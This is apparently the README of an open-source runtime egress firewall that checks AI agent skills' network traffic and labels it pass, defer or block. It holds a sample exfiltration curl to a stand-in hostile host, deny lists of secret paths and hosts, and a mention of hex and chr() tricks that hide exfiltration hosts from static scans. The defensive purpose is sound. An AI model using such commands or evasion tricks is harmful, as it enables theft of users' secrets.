<div align="center">
  <h1>🛡️ Agent Skill Firewall</h1>
  <p><b>Judge an Agent Skill by what it <i>does</i> at runtime — not by what its code looks like.</b></p>
  <p>
    <a href="https://github.com/KuiyiGao/OpenClaw-Skill-Hack/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/KuiyiGao/OpenClaw-Skill-Hack/actions/workflows/ci.yml/badge.svg"></a>
    <img alt="Python 3.10 | 3.11 | 3.12" src="https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12-blue.svg">
    <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-green.svg"></a>
    <a href="#which-agent-are-you-running"><img alt="adapts OpenClaw, Hermes, Claude Code, Cursor" src="https://img.shields.io/badge/adapts-OpenClaw%20%C2%B7%20Hermes%20%C2%B7%20Claude%20Code%20%C2%B7%20Cursor-8A2BE2.svg"></a>
  </p>
</div>

An egress proxy sits between your agent and the internet. Every skill's real
network traffic is checked against five invariants and shown live as one of
three verdicts. Rules live in a TOML you can `diff`.

<div align="center">
<table>
<tr>
  <td align="center"><img alt="PASS" src="https://img.shields.io/badge/PASS-2ea44f?style=for-the-badge"><br><sub>declared intent,<br>allowed host</sub></td>
  <td align="center"><img alt="DEFER" src="https://img.shields.io/badge/DEFER-daaa00?style=for-the-badge"><br><sub>diverges from intent —<br>tighten egress &amp; re-run</sub></td>
  <td align="center"><img alt="BLOCK" src="https://img.shields.io/badge/BLOCK-d1242f?style=for-the-badge"><br><sub>hostile host, cross-plane<br>taint, or injection</sub></td>
</tr>
</table>
</div>

```
   ┌──────────────┐   HTTP_PROXY    ┌──────────────┐   allow ─▶ internet
   │ your agent   │ ──────────────▶ │   firewall   │
   │ openclaw ·   │   (port 8080)   │ proxy+canary │   deny  ─▶ 403 / hold
   │ hermes · …   │ ◀── allow/deny ─│  + L0 + L2   │
   └──────┬───────┘                 └──────┬───────┘
          │ reads SKILL.md                 │ events.jsonl
          │ from .openclaw/skills,         ▼
          │ .hermes/skills, …         firewall panel  (terminal or --web)
```

## Get started in 3 steps

```bash
pip install git+https://github.com/KuiyiGao/OpenClaw-Skill-Hack    # 1. install
firewall config init && firewall start   # 2. run the firewall (proxy + canary)
eval "$(firewall hook hermes)"       # 3. route your agent — then run it as usual
```

Open a live view any time with `firewall panel` (terminal) or
`firewall panel --web` (browser).

## Which agent are you running?

`firewall hook <agent>` prints the exact lines to route that agent's traffic
through the firewall. Run `firewall agents` to see this table on your machine.

<table>
<tr><th>Agent</th><th>Runtime</th><th>How its traffic is caught</th><th>Hook</th></tr>
<tr>
  <td><b>Hermes</b></td><td>Python</td>
  <td>Honours <code>HTTP_PROXY</code> out of the box (httpx / requests).</td>
  <td><code>firewall hook hermes</code></td>
</tr>
<tr>
  <td><b>OpenClaw</b></td><td>Node</td>
  <td>Node <code>fetch</code> ignores <code>HTTP_PROXY</code> → needs the undici bootstrap or Docker (see the OpenClaw section below).</td>
  <td><code>firewall hook openclaw</code></td>
</tr>
<tr>
  <td><b>Claude Code</b></td><td>Node</td>
  <td>Honours <code>HTTP_PROXY</code> / <code>HTTPS_PROXY</code>.</td>
  <td><code>firewall hook claude-code</code></td>
</tr>
<tr>
  <td><b>Cursor</b></td><td>Electron</td>
  <td>Set the proxy in Settings → Network (or via env).</td>
  <td><code>firewall hook cursor</code></td>
</tr>
<tr>
  <td>Codex · Gemini · OpenCode · <i>any</i></td><td>—</td>
  <td>Standard <code>HTTP_PROXY</code> works.</td>
  <td><code>firewall hook generic</code></td>
</tr>
</table>

## Point it at your skills

The firewall never installs a skill — it reads `SKILL.md` folders where they
already live and scans them.

**In an agent project** (`.openclaw/skills`, `.hermes/skills`, `.claude/skills`, …),
`cd` in and it auto-discovers:

```bash
cd ~/my-agent-project
firewall skills                # list every skill it can see
firewall bench .hermes/skills  # batch-scan a folder -> CSV
```

**Your own folder of copied skills** — point at it with `--dir`:

```bash
firewall skills --dir ~/audit-me     # list them
firewall bench  ~/audit-me           # batch-scan -> CSV
firewall scan   ~/audit-me/one-skill # scan one skill
```

<sub>Auto-discovered from the current dir upward, plus `~`:
`.openclaw/skills`, `.hermes/skills`, `.claude/skills`, `.cursor/skills`,
`.codex/skills`, `.gemini/skills`, `.opencode/skills`, `.agents/skills`,
and a bare `skills/`.</sub>

---

<details>
<summary><b>▸ Enforcement modes — how hard it blocks</b></summary>

<br>

`firewall config mode` writes one line to the TOML; the running proxy picks it
up on the **next request, no restart**.

```bash
firewall config mode strict      # block known-bad AND unknown hosts
firewall config mode balanced    # block known-bad, hold unknown (default)
firewall config mode observe     # record only, never block (use for onboarding)
```

Onboard in `observe` for a day to learn which hosts your agent legitimately
needs, add them to `allow_hosts`, then switch to `balanced` or `strict`.

</details>

<details>
<summary><b>▸ From a static scan to a live runtime verdict</b></summary>

<br>

`scan` / `bench` are the static (L0) pass. To catch a skill that only
misbehaves when it runs, put the firewall on the wire:

```bash
firewall start

# a skill tries to exfiltrate — the proxy blocks it before it leaves:
curl -x http://127.0.0.1:8080 http://attacker-canary.evil/exfil
#   HTTP 403  (denied by firewall)

# turn a captured proxy log into an L2 verdict for one skill:
firewall watch ~/audit-me/one-skill --log-file /path/to/proxy.log
#   MALICIOUS score=90  confirmations: hostile_destination:attacker-canary.evil
```

</details>

<details>
<summary><b>▸ OpenClaw — Node <code>fetch</code> that ignores HTTP_PROXY</b></summary>

<br>

OpenClaw uses Node's native `fetch` (undici), which **ignores `HTTP_PROXY`** —
verified against `openclaw@2026.6.10`. Use one of:

**Node bootstrap (host mode)** — inject an undici `ProxyAgent`:

```bash
npm install -g undici
firewall start
export FIREWALL_PROXY=http://127.0.0.1:8080
NODE_OPTIONS="--require $(firewall integrations openclaw-bootstrap)" \
  openclaw skills search hello
```

**Docker mode** — the compose network catches everything:

```bash
cd firewall/docker
export DEEPSEEK_API_KEY=sk-...
docker compose --profile agent up        # firewall + openclaw
```

**Per-provider config** — pins model-API traffic on the host. The proxy is a
single object (set it whole, not field-by-field), the key is `url`, and `<id>`
must be a real provider from `openclaw config get models.providers`:

```bash
firewall start
openclaw config set 'models.providers.<id>.request.proxy' \
  '{"mode":"explicit-proxy","url":"http://127.0.0.1:8080"}'
# then restart the OpenClaw gateway to apply
```

`HTTP_PROXY`/`HTTPS_PROXY` still catch subprocesses a skill spawns
(`curl`, `pip`, `npm`) in every mode.

</details>

<details>
<summary><b>▸ Hermes — Python that just works with HTTP_PROXY</b></summary>

<br>

Hermes Agent (NousResearch) is Python (httpx / requests), which honours the
proxy env vars natively — no bootstrap needed:

```bash
firewall start
eval "$(firewall hook hermes)"    # exports HTTP_PROXY / HTTPS_PROXY / ALL_PROXY
hermes                            # run normally; traffic transits the firewall
```

Hermes reads skills from `~/.hermes/skills` (and `skills.external_dirs` in
`~/.hermes/config.yaml`); `firewall skills` discovers them. `httpx` only reads
the environment when `trust_env` is on (the default) — if a custom endpoint
sets it `False`, pass `proxies=` explicitly.

</details>

<details>
<summary><b>▸ Docker mode</b></summary>

<br>

```bash
firewall start --mode docker     # brings up firewall/docker/compose.yml
firewall panel                   # reads the same events.jsonl
```

The `firewall` service runs the proxy + canary. The optional `openclaw`
service (behind `--profile agent`) bakes in the proxy bootstrap; mount your
skills by editing its volume in `firewall/docker/compose.yml`.

</details>

<details>
<summary><b>▸ Full command reference</b></summary>

<br>

| Command | Does |
|---|---|
| `firewall config init` / `show` / `path` | manage `~/.config/firewall/config.toml` |
| `firewall config mode <strict\|balanced\|observe>` | set enforcement level (live — no restart) |
| `firewall start [--mode host\|docker]` | egress proxy + canary |
| `firewall stop` | docker-compose down |
| `firewall panel [--web]` | live panel: passed / deferred / blocked + session + API usage |
| `firewall scan <skill>` | L0 static scan of one skill |
| `firewall watch <skill> --log-file <log>` | L2 verdict from a stored proxy log |
| `firewall bench <dir> [--log-dir <d>]` | batch L0+L2 over a folder of skills → CSV |
| `firewall skills [--dir <p>]` | list every skill on disk (framework-agnostic) |
| `firewall agents` | list the agent frameworks the firewall adapts to |
| `firewall hook <agent>` | print env-vars / config to route an agent through the proxy |
| `firewall integrations openclaw-bootstrap` | print absolute path to the Node `--require` helper |
| `firewall doctor` | health check (config, API-key env var, ports, optional tools) |

</details>

<details>
<summary><b>▸ Configuration (<code>~/.config/firewall/config.toml</code>)</b></summary>

<br>

Every pattern lives in one TOML file you can `diff`:

```toml
[driver]
provider     = "deepseek"
model        = "deepseek-chat"
api_key_env  = "DEEPSEEK_API_KEY"   # NAME of the env var, NOT the key itself

[policy]
mode = "balanced"                   # strict | balanced | observe

[egress]
allow_hosts = ["api.deepseek.com", "*.pypi.org", ...]
deny_hosts  = ["169.254.169.254", "*.webhook.site", ...]

[secrets]
secret_paths = ["~/.ssh", "~/.aws", ".env"]
secret_env   = ["DEEPSEEK_API_KEY", "AWS_SECRET_ACCESS_KEY"]

[judge]
refusal_patterns    = [ ... ]   # tie-breaker only
compliance_patterns = [ ... ]
judge_prompt_path   = ""        # optional Markdown file with YOUR judge prompt
```

The judge prompt is opt-in — the runtime is fully deterministic by default;
set `judge_prompt_path` only for an LLM tie-breaker.

</details>

<details>
<summary><b>▸ Verdict ladder &amp; the five invariants</b></summary>

<br>

1. **MALICIOUS** (block, score 85) — host classified hostile, cross-plane taint, or injection compliance.
2. **SUSPICIOUS** (defer / tighten egress, score 40+) — any divergence from declared intent.
3. **BENIGN** (pass) — otherwise.

The five invariants the ladder enforces are in
[firewall/runtime/firewall.py](firewall/runtime/firewall.py) and pinned by one
named test each in
[tests/unit/test_firewall_invariants.py](tests/unit/test_firewall_invariants.py).

</details>

<details>
<summary><b>▸ Adapting a new agent (code layout)</b></summary>

<br>

Both skill discovery and `firewall hook` read one file:
[firewall/integrations/agents.py](firewall/integrations/agents.py). A framework
is a single `AgentProfile` — where it keeps skills, and how its traffic leaves
the process (`egress`: `env` / `node-undici` / `app-config`). Adding Hermes was
~12 lines there; nothing else changed.

```
firewall/
  cli.py            entry point for all subcommands
  config.py         TOML loader + default patterns
  runtime/          L2 IAR verifier, egress proxy, canary, supervisor, events
  gate/             L0 static scanner
  skills/           SKILL.md discovery (dirs sourced from the agent registry)
  integrations/     agents.py registry + openclaw/proxy-bootstrap.js
  panel/            tui.py (terminal) + web.html/web.py (browser)
  docker/           minimal compose stack
  examples/         weather-safe + weather-malicious-canary
```

</details>

<details>
<summary><b>▸ Evaluation &amp; comparison with NVIDIA SkillSpector</b></summary>

<br>

On a 112-case corpus (76 malicious, 36 benign):

| Detector | Recall (of 76) | Precision | False-kills (of 36) | F1 |
|---|---:|---:|---:|---:|
| Cisco static (offline) | 42.1% | 0.94 | 2 | 0.58 |
| Cisco + LLM (strict) | 98.7% | 0.92 | **7** | 0.95 |
| Our static | 93.4% | 1.00 | 0 | 0.97 |
| **Our static ∪ runtime** | **98.7%** | **1.00** | **0** | **0.993** |

[NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) is a **pre-install
scanner** (68 patterns, SARIF output). `agent-skill-firewall` is a **runtime
behavioural firewall** — it watches real egress and emits PASS/DEFER/BLOCK. The
two are complementary: SkillSpector at install-time, this at run-time.

Local bench, SkillSpector v2.3.7 (`--no-llm`), 5 cases:

| Case | Truth | SkillSpector | Our L0 | Our IAR |
|---|---|---|---|---|
| `weather-safe` | benign | SAFE | NONE | BENIGN |
| `weather-malicious-canary` | malicious | SAFE | **CRITICAL** | **MALICIOUS** |
| `config-redirect-malicious` | malicious | SAFE | NONE | **MALICIOUS** |
| `hex-encode-malicious` | malicious | SAFE | NONE | **MALICIOUS** |
| `dyn-url-malicious` | malicious | SAFE | NONE | **MALICIOUS** |

SkillSpector returned `SAFE` on 4/4 malicious cases at its `--no-llm` floor.
Cases 3–5 are static-evasive by construction (host comes from a JSON manifest /
hex blob / `chr()` arithmetic) and only surface at runtime. Example skills ship
under `firewall/examples/skills/`; the full dataset is not included.

</details>

## License

MIT — see [LICENSE](LICENSE).
